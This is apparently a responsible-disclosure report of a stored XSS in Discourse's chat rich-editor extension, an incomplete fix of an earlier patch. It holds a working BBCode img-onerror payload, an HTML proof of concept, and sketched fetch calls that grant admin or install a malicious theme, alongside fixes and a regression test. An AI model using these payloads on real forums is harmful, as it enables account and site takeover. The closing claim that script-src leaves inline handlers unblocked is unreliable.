# Stored XSS in Rich Editor via `[chat]` BBCode username — incomplete fix bypass of the 2025-08-27 chat transcript XSS patch

## Summary

A low-privileged forum user can plant a stored XSS payload inside the `quote="…"` attribute of a `[chat]` BBCode block. The cooked HTML is benign (so reading the topic is safe), but the post's raw markdown is preserved verbatim. When **any other user opens the post in the WYSIWYG ("rich") editor** — most notably an administrator or moderator clicking *Edit* — the chat transcript extension assigns the attacker-controlled `username` segment directly into `Element.innerHTML`, executing attacker JavaScript in the victim's authenticated origin context.

This is an **incomplete-fix variant** of the chat transcript XSS that was patched on 2025-08-27 in commit `3a224fd546` / `6aae74d082` ("SECURITY: Rich editor chat transcript XSS"). That patch escaped the `channel` and `threadTitle` interpolations on the same code path but left the `username` interpolation in the same `toDOM` function unescaped. The unsafe sink has been live in `main` for ~10 months and is present in the current HEAD (`06dfd48a17`, 2026-06-17).

Because `default_composition_mode = 1` (= `rich`) in `config/site_settings.yml`, every new account — including staff — uses the vulnerable editor by default. The bug becomes the well-known *malicious post + staff clicks Edit = admin takeover* chain.

## Weakness

CWE-79 — Improper Neutralization of Input During Web Page Generation (Stored / DOM-based XSS)

## Severity (CVSS 3.1)

**8.0 — High** — `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`

- **AV:N** Network: payload is delivered through a normal post.
- **AC:L** Low complexity: no race / timing / heap grooming, just `[chat …]` markdown.
- **PR:L** Low privileges: attacker only needs to be a posting member.
- **UI:R** User interaction required: the victim opens the post in the rich editor (clicks Edit or quotes the whole post).
- **S:C** Scope changed: JS runs with the victim's site session, reaching the admin API.
- **C:H / I:H** High confidentiality + integrity: full admin API access if victim is staff (install a theme component = persistent JS for all visitors); password / email change for non-staff victims.

## Affected component

- File: `plugins/chat/assets/javascripts/lib/rich-editor-extension.js` (lines 75-78)
- Plugin: `chat` (shipped in-tree, enabled by default on every Discourse install that bundles chat)
- Pre-condition: `chat_enabled = true` (default) and `default_composition_mode = 1` (default, = rich editor)
- Tested commit: `06dfd48a17` (Jun 17 2026), `main` branch

## Vulnerable code

```js
// plugins/chat/assets/javascripts/lib/rich-editor-extension.js (toDOM, lines 67-78)
const userElement = document.createElement("div");
userElement.classList.add("chat-transcript-user");

const formattedDateTime = moment(node.attrs.datetime).format(
  i18n("dates.long_no_year")
);
userElement.innerHTML = `
  <span class="chat-transcript-username">${node.attrs.username}</span>
  <span class="chat-transcript-datetime">${formattedDateTime}</span>
`;
```

`node.attrs.username` is the first `;`-separated segment of the `quote="…"` BBCode attribute, propagated through the markdown-it token stream to the ProseMirror node with no escape:

| Step | Location | What happens |
|---|---|---|
| 1 | `frontend/discourse-markdown-it/src/features/bbcode-block.js:85-88` | BBCode tokenizer accepts `"[^"]+"` (and smart-quote variants) inside `quote="…"` — `<`, `>`, `=` survive. |
| 2 | `plugins/chat/assets/javascripts/lib/discourse-markdown/chat-transcript.js:19-20` | `const [username, …] = tagInfo.attrs.quote.split(";");` |
| 3 | same file, line 131 | `wrapperDivToken.attrs.push(["data-username", username]);` — raw, unescaped. |
| 4 | `plugins/chat/assets/javascripts/lib/rich-editor-extension.js:190` | `username: token.attrGet("data-username")` — returns the raw token attr value. |
| 5 | same file, line 75-78 | `userElement.innerHTML = \`…${node.attrs.username}…\`` — sink. |

The cooked-HTML pipeline (`Post.cook`) HTML-escapes attributes when rendering tokens to HTML, so the rendered post is safe to *view*. The rich editor parses the markdown source again through markdown-it without going through HTML rendering, so it sees the raw value at step 5.

## Why this is an incomplete-fix variant of GHSA / commit `3a224fd546`

```diff
// commit 3a224fd546, 2025-08-27, "SECURITY: Rich editor chat transcript XSS"
// "the title of the channel and the title of the thread could be an XSS vector"

-channel: emojiUnescape(node.attrs.channel),       // line 52
+channel: replaceEmoji(node.attrs.channel),         // ← FIXED

-channelLinkElement.innerHTML = `#${emojiUnescape(node.attrs.channel)}`;   // line 61
+channelLinkElement.innerHTML = `#${replaceEmoji(node.attrs.channel)}`;    // ← FIXED

-threadTitleElement.innerHTML = node.attrs.threadTitle ? emojiUnescape(...)  // line 106
+threadTitleElement.innerHTML = node.attrs.threadTitle ? replaceEmoji(...)    // ← FIXED
```

The patch hardened three sinks in the same `toDOM` function but never touched **line 75-78**, where `node.attrs.username` is concatenated into `innerHTML` without any escape at all (not even the unsafe `emojiUnescape`). `replaceEmoji` (`frontend/discourse/app/ui-kit/helpers/d-replace-emoji.js`) runs `escapeExpression()` first; this is the exact wrapper that should have been applied to `username` as well.

## Steps to reproduce

Prerequisites:
- Discourse instance with the bundled `chat` plugin enabled (default).
- Two accounts: a low-priv attacker (`attacker`, TL1) and a victim with `composition_mode = rich` — the default for every new account.

1. As `attacker`, create a topic (or reply in any topic the account can post in) with this body:

   ```
   [chat quote="<img src=x onerror=alert(`XSS as `+document.domain)>;1;2026-01-01T00:00:00Z" channel="x" channelId=1]
   ordinary looking reply
   [/chat]
   ```

   Submit. The post renders as a normal-looking embedded chat-quote card with a broken avatar. **No script fires for readers.**

2. As the victim (any account with rich editor — by default any account), navigate to the topic and click the pencil ✏️ (Edit) icon on the attacker's post, **or** click "Quote whole post" and let the composer mount.

3. The ProseMirror editor calls `Parser.convert(schema, postRaw)`. The chat extension's `parse:` hook reads `data-username` and stores it on the new `chat` node. Then `toDOM` runs the assignment quoted above. The browser parses the resulting markup, fails to load `src=x`, fires `onerror`, and executes the payload.

4. **Observed:** an `alert("XSS as <victim-host>")` fires in the victim's authenticated session on the Discourse origin.

## Proof of concept

### Stored payload (paste into the composer body)

```
[chat quote="<img src=x onerror=alert(`XSS as `+document.domain)>;1;2026-01-01T00:00:00Z" channel="x" channelId=1]
hi
[/chat]
```

### What the rich editor actually does (minimal browser repro of the sink)

```html
<!doctype html>
<div id="host"></div>
<script>
  // Same string the markdown-it -> ProseMirror parse hook stores on the
  // chat node when it sees the BBCode above (raw, unescaped from
  // tagInfo.attrs.quote.split(";")[0]):
  const username = "<img src=x onerror=alert(`XSS as `+document.domain)>";

  // Exact template literal from
  // plugins/chat/assets/javascripts/lib/rich-editor-extension.js:75-78
  const userElement = document.createElement("div");
  userElement.classList.add("chat-transcript-user");
  const formattedDateTime = "2026-01-01";
  userElement.innerHTML = `
    <span class="chat-transcript-username">${username}</span>
    <span class="chat-transcript-datetime">${formattedDateTime}</span>
  `;

  document.getElementById("host").appendChild(userElement);
</script>
```

Open in a browser → `alert(...)` fires. On a live Discourse the alert reads `XSS as <forum-host>`, confirming same-origin execution.

## Impact

JavaScript executes on the Discourse origin with the victim's session cookies, the page's `<meta name="csrf-token">` value, and any pre-loaded data. Concrete attacker capabilities, depending on who opens the post in the rich editor:

- **Victim is admin / moderator (the realistic high-impact path)**
  - `fetch('/admin/users/<id>/grant_admin', {method: 'PUT', headers: {'X-CSRF-Token': document.head.querySelector('meta[name=csrf-token]').content}})` — promote the attacker.
  - `fetch('/admin/customize/themes', …)` to install a malicious theme component → **persistent JS for every visitor of the forum → full forum takeover** from a single moderation action.
  - Read admin-only endpoints (users, IPs, site settings, secret keys exposed in the admin UI).

- **Victim is a normal user who quotes the post**
  - Silent email/password change via `/u/<them>/preferences/email` → account takeover.
  - Post on the victim's behalf, read PMs, etc.

The chain is reliable because Discourse admin/mods routinely click *Edit* on flagged or reported content — and the attacker can flag their own post to draw a moderator in. No further interaction beyond opening the editor is required; `convertFromValue` runs on mount.

## Suggested fix

Two equivalent options. Either is sufficient.

**Option A (one-liner, matches the 2025-08-27 patch idiom):**

```diff
+import { escapeExpression } from "discourse/lib/utilities";
 …
 userElement.innerHTML = `
-  <span class="chat-transcript-username">${node.attrs.username}</span>
-  <span class="chat-transcript-datetime">${formattedDateTime}</span>
+  <span class="chat-transcript-username">${escapeExpression(node.attrs.username)}</span>
+  <span class="chat-transcript-datetime">${escapeExpression(formattedDateTime)}</span>
 `;
```

**Option B (preferred — stop using `innerHTML` for user attrs):**

```js
const userElement = document.createElement("div");
userElement.classList.add("chat-transcript-user");

const usernameSpan = document.createElement("span");
usernameSpan.className = "chat-transcript-username";
usernameSpan.textContent = node.attrs.username;
userElement.appendChild(usernameSpan);

const dateSpan = document.createElement("span");
dateSpan.className = "chat-transcript-datetime";
dateSpan.textContent = formattedDateTime;
userElement.appendChild(dateSpan);
```

### Regression test

The existing test in `plugins/chat/test/javascripts/components/rich-editor-extension-test.gjs` only asserts `.textContent` on a benign username (`"hunter"`). `textContent` of `<span><img …></span>` is the empty string, so a malicious username slipped past the test silently. Add an assertion such as:

```js
const malicious = `[chat quote="<img src=x onerror=window.__pwn=true>;1;2026-01-01T00:00:00Z" channel="x" channelId=1]\nhi\n[/chat]`;
const [{ value }] = await setupRichEditor(assert, malicious);
assert.strictEqual(
  document.querySelectorAll(".chat-transcript-username img").length,
  0,
  "username must not produce <img> descendants"
);
assert.notOk(window.__pwn, "no XSS side-effect");
```

While you are in the area, audit the `serializeNode` quoting at line 144 of the same file — the `bbCodeAttrs` string builder concatenates `node.attrs.username` into a `quote="…"` attribute with no escape of `"`. It is not an XSS vector (the resulting markdown is just malformed), but the same root cause (no escape on `username`) makes it a small follow-up.

## References

- Same-file prior fix (incomplete): commit `3a224fd546` (and identical re-commit `6aae74d082`), 2025-08-27, "SECURITY: Rich editor chat transcript XSS" — patches `channel` (×2) and `threadTitle` but not `username`.
- Affected file at vulnerable HEAD: `plugins/chat/assets/javascripts/lib/rich-editor-extension.js`
- Default settings making the bug reach every user: `config/site_settings.yml` (`default_composition_mode: 1`).
- Markdown-side source: `plugins/chat/assets/javascripts/lib/discourse-markdown/chat-transcript.js:19-20, 131`.
- BBCode attribute tokenizer: `frontend/discourse-markdown-it/src/features/bbcode-block.js:85-88`.
- Parser entrypoint that triggers `toDOM`: `frontend/discourse/app/static/prosemirror/components/prosemirror-editor.gjs:333-349`.

---

**Note for triager:** because this is an incomplete fix of an already-disclosed advisory, the same conditions that originally applied to the channel/thread variants (CSP-disabled environments most directly affected) likely apply here. Self-hosted Discourse installs with a permissive or absent CSP are the immediate exposure; sites running the default CSP are still affected when the payload uses inline event handlers like `onerror` because those are not blocked by `script-src` directives.
